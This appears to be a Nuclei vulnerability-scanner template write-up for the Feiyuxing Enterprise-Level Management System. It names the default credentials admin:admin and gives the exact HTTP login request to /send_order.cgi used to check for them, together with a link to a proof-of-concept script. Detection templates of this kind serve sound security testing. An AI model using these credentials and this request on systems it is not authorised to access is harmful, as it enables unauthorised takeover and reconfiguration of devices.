# Nuclei Template: Feiyuxing Enterprise-Level Management System - Default Login
**Template ID:** feiyuxing-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`feiyuxing-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Attackers can log in through admin:admin, check the system status, and configure the device.

## Steps to reproduce / Exploit Payload
```http
POST /send_order.cgi?parameter=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

{"username":"{{username}}","password":"{{password}}"}
```

## References
- https://github.com/wushigudan/poc/blob/main/%E9%A3%9E%E9%B1%BC%E6%98%9F%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81.py
